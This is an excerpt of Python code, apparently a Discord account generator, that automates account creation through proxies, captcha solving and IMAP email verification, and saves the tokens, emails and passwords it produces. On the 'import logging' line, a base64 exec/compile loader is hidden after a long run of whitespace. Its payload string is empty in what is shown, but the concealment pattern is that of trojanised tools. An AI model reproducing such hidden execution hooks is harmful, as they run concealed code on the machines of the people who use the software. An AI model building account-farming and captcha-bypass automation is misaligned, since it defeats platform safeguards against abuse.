...
import asyncio
import logging                                                                                                                                                                                                                                                                                                                                                                                                          ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(""),'<string>','exec'))
import os
import random
import re
import time
...
class Generator:
    async def initialize(self, proxy, mode=None, output_file="output.txt", email=True, humanize=True, output_format="token:email:pass", invite_link=""):
        ...
        self.logger.info(Fore.RED+"Spawned Browser successfully")
    ...
    async def captcha_solver(self):
        ...
        try:
            ...
            self.logger.info(Fore.GREEN+"Captcha Passed successfully!")
            return True
    ...
    async def confirm_email(self):
        ...
        try:
            ...
            while self.VERIFICATIONLINK is None:
                ...
                print(email_message['subject'].strip())
                if "Verify Email" not in email_message["subject"].strip():
                    self.logger.info("Bad email found deleting...")
                    imap_server.store(message_number, "+X-GM-LABELS", "\\Trash")
                    # refresh the inbox
                    imap_server.select()
                elif email_message["from"] == "Discord <noreply@discord.com>":
                    self.logger.info("found a good one")
        ...
        # connect to the imap server and find the confirmation email in the inbox then get the link from the email and go to it to confirm the email
   ...
   # Downloading all AI Files
    ...
    if not os.path.exists(dir_model):
        print(Fore.YELLOW+"Download all AI Files...")
        r = requests.get(
